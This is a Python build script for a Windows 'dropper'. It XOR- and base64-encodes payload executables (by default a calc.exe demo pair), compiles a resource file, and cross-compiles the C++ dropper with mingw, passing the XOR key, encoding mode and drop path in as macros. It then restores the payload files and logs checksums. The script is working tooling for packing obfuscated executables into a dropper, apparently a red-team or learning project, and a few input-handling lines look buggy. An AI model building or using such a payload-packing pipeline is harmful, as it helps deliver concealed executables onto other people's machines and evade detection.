import argparse
import base64
import hashlib
import os
import subprocess
from dataclasses import dataclass

@dataclass
class Args:
	release: bool
	debug: bool
	x64: bool
	x86: bool
	base64: bool
	default_xor: bool
	xor_key: int
	both_encoding: bool
	hardcode: bool
	input: str
	output: str
	resource: str
	header: str
	encode_list: list[str]
	dropper_write: str
	keep_log: bool
	log_number: int
	logging_output: str
	no_encode: bool
	no_compile: bool
	no_decode: bool
	test_output: bool

# This makes it so that the python file can take arguments.
def parse_args() -> Args:
	parser = argparse.ArgumentParser(description="This is a script to encode a payload, compiles a file with mingw,  and then decode the payload.")

	# release will be prioritized if both are off.
	parser.add_argument("--release", action="store_true")
	parser.add_argument("--debug", action="store_true")

	parser.add_argument("--x64", action="store_true")
	parser.add_argument("--x86", action="store_true")

	parser.add_argument("--base64", action="store_true")
	parser.add_argument("--default_xor", action="store_true")
	parser.add_argument("--xor_key", type=int, default=0)
	parser.add_argument("--both_encoding", action="store_true")

	parser.add_argument("--hardcode", action="store_true")

	parser.add_argument("--input", type=str, default="")
	parser.add_argument("--output", type=str, default="")
	parser.add_argument("--resource", type=str, default="")
	parser.add_argument("--header", type=str, default="")
	parser.add_argument("--encode_list", nargs="*", type=str, default=[])
	parser.add_argument("--dropper_write", type=str, default="")

	parser.add_argument("--keep_log", action="store_true")
	parser.add_argument("--log_number", type=int, default=0)
	parser.add_argument("--logging_output", type=str, default="")

	parser.add_argument("--no_encode", action="store_true")
	parser.add_argument("--no_compile", action="store_true")
	parser.add_argument("--no_decode", action="store_true")

	# would handle the printing out of data.
	parser.add_argument("--test_output", action="store_true")

	args = parser.parse_args()

	return Args(
		release=args.release,
		debug=args.debug,
		x64=args.x64,
		x86=args.x86,
		base64=args.base64,
		default_xor=args.default_xor,
		xor_key=args.xor_key,
		both_encoding=args.both_encoding,
		hardcode=args.hardcode,
		input=args.input,
		output=args.output,
		resource=args.resource,
		header=args.header,
		encode_list=args.encode_list,
		dropper_write=args.dropper_write,
		keep_log=args.keep_log,
		log_number=args.log_number,
		logging_output=args.logging_output,
		no_encode=args.no_encode,
		no_compile=args.no_compile,
		no_decode=args.no_decode,
		test_output=args.test_output
	)

# converts the release/debug and x86/x64 into a PE executable with mingw.
def mingw_run(file_path: str, file_exe_path: str, dropper_write: str, configuration_bool: bool, arch: int, xor_key: int, base64: bool, output_file: str, test_output: bool) -> int:

	if (base64 == True):
		base64_integer = 1
	else:
		base64_integer = 0

	if (test_output):
		print(f"This is the file path: {file_path}. This is the output path: {file_exe_path}.")
		print(f'These are the notable flags in mingw: -DDROPPER_XOR_KEY={xor_key!s} -DDROPPER_BASE64={base64_integer!s} -DDROPPER_OUTPUT="{dropper_write}"')

	if (arch == 64):
		mingw_version = "x86_64-w64-mingw32-g++"
		print("mingw is compiling in x64 mode. ")
	elif (arch == 86):
		mingw_version = "i686-w64-mingw32-g++"
		print("mingw is compiling in x86 mode. ")
	else:
		mingw_version = "i686-w64-mingw32-g++"
		print("The --architecture flag only acccepts 64 or 86. \nThis script will run mingw in x86 mode.")

	print(f"This is your mingw_version: {mingw_version!s}")
	print(f"This is your dropper write: {dropper_write!s}")

	if (configuration_bool == True):
		success = subprocess.run([
		mingw_version,
		"-w",
		"-fpermissive",
		file_path,
		output_file,
		"-static",
		"-static-libgcc",
		"-static-libstdc++",
		"-o",
		file_exe_path,
		"-DNDEBUG",
		f'-DDROPPER_OUTPUT="{dropper_write}"',
		f"-DDROPPER_XOR_KEY={xor_key!s}",
		f"-DDROPPER_BASE64={base64_integer!s}"
		], check=False)
	else:
		success = subprocess.run([
		mingw_version,
		"-g",
		"-w",
		"-fpermissive",
		file_path,
		output_file,
		"-static",
		"-static-libgcc",
		"-static-libstdc++",
		"-o",
		file_exe_path,
		f'-DDROPPER_OUTPUT="{dropper_write}"',
		f"-DDROPPER_XOR_KEY={xor_key!s}",
		f"-DDROPPER_BASE64={base64_integer!s}"
		], check=False)

	# 0 for success
	return success.returncode


#compile the rc file so it can be added with g++
def rc_compile(arch: int, output_file: str, test_output: bool, resource: str) -> int:

	if (arch == 86):
		windres_version = "i686-w64-mingw32-windres"
		pe_config = "pe-i386"
	elif (arch == 64):
		windres_version = "x86_64-w64-mingw32-windres"
		pe_config = "pe-x86-64"
	else:
		windres_version = "i686-w64-mingw32-windres"
		pe_config = "pe-i386"

	if (test_output == True):
		print("\nThe pe_config is: " + pe_config + "\n" + "The output of the windres cross compile is: " + output_file + "\n")

	success = subprocess.run([
	windres_version,
	"-F",
	pe_config,
	"-O",
	"coff",
	"-I",
	"FileSystem_exe_rebuild/",
	resource,
	"-o",
	output_file
	], check=False)

	# 0 for sucess
	return success.returncode

def get_log_message(base64: bool, xor: bool, error: bool, error_message: Exception | None, payload: str, log_number: int, log_subnumber: int, test_output: bool) -> str:

	# Logging will handle before encoding, after encoding xor, and after encoding base64
	# and after decoding base64 and after decoding xor

	payload_bytes = file_read(base64, xor, payload, test_output)

	log_info = hashlib.md5(payload_bytes).hexdigest()
	pr = None
	message = None

	if (base64 == False and xor == False):
		message = f"This is the checksum of the file before encoding is applied from log number: {log_number!s} log subnumber: {log_subnumber!s}: \n{log_info!s} "
	if (base64 == True):
		message = f"This is the checksum of what is preserved after applying base64 to the payload (utf-8 decoded) from log number: {log_number!s} log subnumber: {log_subnumber!s}\n{log_info!s}"
	elif (xor == True):
		message = f"This is the checksum of what is preserved after applying xor to the payload (utf-8 decoded) from log number: {log_number!s} log subnumber: {log_subnumber!s}\n{log_info!s}"
	elif (error == True):
		message = str(error_message)
		print("--------------------------ERROR WITH ENCODING--------------------------\n")

	with open(payload, "rb") as payload_read:
		pr = payload_read.read(32)

	final_message = f"{message} \n {pr!s} \n\n"
	return final_message

def log_file(preserve_path: str, message: str) -> None:

	with open(preserve_path, "a", encoding="utf-8") as file_preserve_read:
		file_preserve_read.write(message)

def decode_payload(base64: bool, xor: bool, payload_bytes: bytes) -> str:
	payload = ""
	try:
		payload = payload_bytes.decode("utf-8")

	except UnicodeDecodeError:
		if (base64 == True):
			payload = "<This couldn't be decoded in a way that was visible from command line. That doesn't mean the base64 didn't work.>"
		elif (xor == True):
			payload = "<This couldn't be decoded in a way that was visible from command line. That doesn't mean the xor didn't work.>"
	return payload

def file_read(base64: bool, xor: bool, payload_file: str, test_output: bool) -> bytes:

	with open(payload_file, "rb") as read_file:
		payload_bytes = read_file.read()

	if test_output == True:
		if base64 == True:
			print(f"This is payload_bytes after base64: {payload_bytes.hex()!s:10}")
		if xor == True:
			print(f"This is payload_bytes after xor: {payload_bytes.hex()!s:10}")

	return payload_bytes

def base64_file(encode: bool, decode: bool, payload_file: str, log_message: str, logging_output: str, log_number: int, log_subnumber: int, test_output: bool) -> tuple[bool, str]:

	encode_base64 = True
	encode_xor = False
	payload_bytes = file_read(encode_base64, encode_xor, payload_file, test_output)

	base64_log = True
	xor_log = False
	error = False
	error_msg = None

	try:
		encoded_payload_bytes = base64.b64encode(payload_bytes)
	except Exception as e:
		print("There is an error")
		error = True
		error_msg = e
		base64_log = False
		log_message += get_log_message(base64_log, xor_log, error, error_msg, payload_file, log_number, log_subnumber, test_output)
		return False, log_message

	if (encode == True):
		if test_output == True:
			print("This is the base64 encoded version of your payload (in hexadecimal): " + encoded_payload_bytes.hex())
		with open(payload_file, "wb") as file_write:
			file_write.write(encoded_payload_bytes)

		if logging_output != "":
			log_message += get_log_message(base64_log, xor_log, error, error_msg, payload_file, log_number, log_subnumber, test_output)

	if (decode == True):
		error = False
		error_msg = None
		decoded_payload_bytes = base64.b64decode(payload_bytes)
		if (test_output == True):
			print("This is the base64 decoded version of your payload (in hexadecimal): " + decoded_payload_bytes.hex())
		with open(payload_file, "wb") as file_write:
			file_write.write(decoded_payload_bytes)

		if logging_output != "":
			log_message += get_log_message(base64_log, xor_log, error, error_msg, payload_file, log_number, log_subnumber, test_output)

	return True, log_message

def xor_file(payload_file: str, xor_key: int, log_message: str, logging_output: str, log_number: int, log_subnumber: int, test_output: bool) -> str:

	base64 = False
	xor = True
	error = False
	error_msg = None
	payload_bytes = file_read(base64, xor, payload_file, test_output)

	encoded_payload_bytes = bytes([char ^ xor_key for char in payload_bytes])

	if (test_output == True):
		print(f"This is the xor encoded or decoded version of your payload (in hexadecimal): {encoded_payload_bytes.hex()!s:20}")
		print(f"This is the xor key: {xor_key}")

	with open(payload_file, "wb") as file_write:
		file_write.write(encoded_payload_bytes)

	if logging_output != "":
		log_message += get_log_message(base64, xor, error, error_msg, payload_file, log_number, log_subnumber, test_output)

	return log_message

def revise_args(args: Args) -> None:

	if (args.hardcode != True):

		if (args.input == ""):
			args.input = input("Give the file path of the file that will be cross compiled with mingw: ")
		else:
			if (args.test_output == True):
				print("args.input gotten from input flag.")

		if (args.resource == ""):
			args.resource = input("Give the file path to the resource file you are going to use.")
		else:
			if (args.test_output == True):
				print("args.resource gotten from resource flag.")

		if (args.header == ""):
			args.header = input("Give the file path to the header file you are going to use.")
		else:
			if (args.test_output == True):
				print("args.header gotten from header flag.")

		if (args.encode_list == []):
			num_files = int(input("How many files will the dropper be injecting: "))
			for i in range(num_files):
				args.encode_list[i] = input("Set the default file path to the payloads that the dropper will inject: ")
		else:
			if (args.test_output == True):
				print("args.encode_list goten from encode_list flag.")

		if (args.output == ""):
			args.output = input("Give the file path to the place where the exe will place after msbuild compiles it (should have an exe file extension): ")
		else:
			if (args.test_output == True):
				print("args.output gotten from the output flag.")

		if (args.dropper_write == ""):
			args.dropper_write = input("Set the file path for the dropper write path that will be created in the c++ file: ")
		else:
			if (args.test_output == True):
				print("args.dropper_write gotten from dropper write flag.")

		if (args.logging_output != ""):
			args.logging_output = input("Give the file path to the place where logging will occur: ")
		else:
			if (args.test_output == True):
				print("args.logging_output gotten from logging_output flag.")
	else:
		# hardcode True

		# Update the exe path based on if release, debug or neither was chosen.
		# exe path is overriden if output flag flag is set.

		if (args.input != ""):
			print("file_path gotten from input flag.")
			if (args.test_output == True):
				print(f"This is args.input: {args.input}")
		else:
			args.input = r"FileSystem_exe_rebuild/FileSystem_exe_rebuild.cpp"

		if (args.resource != ""):
			print("file_resource_path gotten from resource flag.")
			if (args.test_output == True):
				print(f"This is args.resource: {args.resource}")
		else:
			args.resource = r"FileSystem_exe_rebuild/W7_resource.rc"

		if (args.header != ""):
			print("file_header_path gotten from header flag.")
			if (args.test_output == True):
				print(f"This is args.header: {args.header}")
		else:
			args.header = r"FileSystem_exe_rebuild/resource.h"

		if (args.encode_list != []):
			print("file_encode_list_path gotten from file encode list path flag.")
			if (args.test_output == True):
				for i in range(len(args.encode_list)):
					message = args.encode_list[i] + "\n"
				print(f"This is args.encode_list: \n {message}")
		else:
			args.encode_list = [r"FileSystem_exe_rebuild/payloads/w7_calc.exe", r"FileSystem_exe_rebuild/payloads/en-US/w7_calc.exe.mui"]

		if (args.output != ""):
			print("file_exe_path gotten from output flag.")
			if (args.test_output == True):
				print("This is args.output: " + args.output)
		else:
			args.output = r"FileSystem_exe_rebuild/FileSystem_exe_rebuild.exe"

		if (args.dropper_write != ""):
			print("file_dropper_write_path gotten from file_dropper_write_path flag.")
			if (args.test_output == True):
				print(f"This is the args.dropper_write: {args.dropper_write}")
		else:
			args.dropper_write = r"\\\\exe_num28.exe"

		if (args.logging_output != ""):
			print("file_payload_preserve_path gotten from logging output.")
			if (args.test_output == True):
				print(f"This is args.logging_output: {args.logging_output}")
		else:
			args.logging_output = r"preserve_payload_contents.txt"

def log_reset(logging_output: str, test_output: bool) -> None:
	with open(logging_output, "w", encoding="utf-8") as file_write:
		file_write.write("")
		if (test_output == True):
			print("file_payload_preserve_path has been reset.")

def set_architecture(x86: bool, x64: bool) -> int:
	if (x86 == True):
		return 86
	elif (x64 == True):
		return 64
	else:
		return 86

def set_encoding_values(args: Args) -> None:
	if (args.both_encoding == True):
		args.base64 = True
		args.xor_key = 115

	if (args.default_xor == True):
		args.xor_key = 115

	if (args.xor_key > 255 or args.xor_key < 0):
		print("This script only lets positive xor_keys up to 255. No more. The script will now handle the xor_key as 255.")
		args.xor_key = 255

def get_resource_object(output_file: str) -> str:
	output_file = os.path.splitext(output_file)[0]
	output_file = f"{output_file}.o"

	print("This is the output file: " + output_file)
	return output_file

def main() -> int:

	#//////////////////////////////////////////////////////

	# Setting all relevant file paths

	#//////////////////////////////////////////////////////

	args = parse_args()

	revise_args(args)

	if (args.keep_log == False):
		log_reset(args.logging_output,  args.test_output)

	error = False
	error_msg = None

	architecture = set_architecture(args.x86, args.x64)
	set_encoding_values(args)

	log_list: list[str] = [""] * len(args.encode_list)
	result: bool = False

	for i in range(len(args.encode_list)):
		if args.logging_output != "":
			log_list[i] += get_log_message(False, False, False, None, args.encode_list[i], args.log_number, i, args.test_output)

	#//////////////////////////////////////////////////////

	# Encode payload

	#//////////////////////////////////////////////////////

		if (args.no_encode == True): # no encode

			if args.base64 == True or args.both_encoding == True:
				base64 = True
				xor = False
				if args.logging_output != "":
					log_list[i] += get_log_message(base64, xor, error, error_msg, args.encode_list[i], args.log_number, i, args.test_output)

			if (args.default_xor == True or args.xor_key != 0 or args.both_encoding == True):
				base64 = False
				xor = True
				if args.logging_output != "":
					#get_log_message needs to read from the file inside of the function
					log_list[i] += get_log_message(base64, xor, error, error_msg, args.encode_list[i], args.log_number, i, args.test_output)
			if i == 0:
				if args.logging_output != "":
					print("No encode flag was chosen so nothing was encoded. Logging occurred.")
				else:
					print("No encode flag was chosen so nothing was encoded. Logging did not occurred.")

		else: # do encode

			encode = True
			decode = False
			if (args.default_xor == True or args.both_encoding == True or args.xor_key != 0):
				log_list[i] = xor_file(args.encode_list[i], args.xor_key, log_list[i], args.logging_output, args.log_number, i,  args.test_output)
			if (args.base64 == True or args.both_encoding == True):
				result, log_list[i] = base64_file(encode, decode, args.encode_list[i], log_list[i], args.logging_output, args.log_number, i, args.test_output)
				if result == False:
					for l in range(len(log_list)):
						log_file(args.logging_output, log_list[l])
					return 1

	#/////////////////////////////////////////////////////////

	# compile

	#/////////////////////////////////////////////////////////

	if (args.no_compile == False):

		print(" ")

		# replace the file extension of script_info["file_resource_path"] with .o
		output_file = get_resource_object(args.input)

		success = rc_compile(architecture, output_file, args.test_output, args.resource)
		if (success == 0):
			print("The rc compiled successfully.")
		else:
			print("The rc did not compile successfully.")
			return 1

		if args.release == True:
			set_mingw_release = True
			success = mingw_run(args.input, args.output, args.dropper_write, set_mingw_release, architecture, args.xor_key, args.base64, output_file, args.test_output)
			if (success == 0):
				print("mingw ran successfully in release mode. Warnings are turned off.")
		elif (args.debug == True):
			set_mingw_release = False
			success = mingw_run(args.input, args.output, args.dropper_write, set_mingw_release, architecture, args.xor_key, args.base64, output_file, args.test_output)
			if (success == 0):
				print("mingw ran successfully in debug mode. Warnings are turned off. ")
		else:
			# will run in Release mode.
			set_mingw_release = True
			success = mingw_run(args.input, args.output, args.dropper_write, set_mingw_release, architecture, args.xor_key, args.base64, output_file, args.test_output)
			if (success == 0):
				print("mingw ran successfully in release mode. Warnings are turned off. ")

		print("\n")

	else:
		print("No compile was chosen so nothing was compiled.")

	#//////////////////////////////////////////////////////

	# Decode payload

	#//////////////////////////////////////////////////////

	if (args.no_decode == False):
		encode = False
		decode = True

		for k in range(len(args.encode_list)):
			if (args.base64 == True or args.both_encoding == True):
				result, log_list[k]= base64_file(encode, decode, args.encode_list[k], log_list[k], args.logging_output, args.log_number, k, args.test_output)
				if result == False:
					print("There was an error with base64")
					for l in range(len(log_list)):
						log_file(args.logging_output, log_list[l])
					return 1

			if (args.default_xor == True or args.xor_key != 0 or args.both_encoding == True):
				log_list[k] = xor_file(args.encode_list[k], args.xor_key, log_list[k], args.logging_output, args.log_number, k,  args.test_output)

			log_file(args.logging_output, log_list[k])

	else:

		print("No decode was chosen so nothing was decoded.")


	return 0

main()
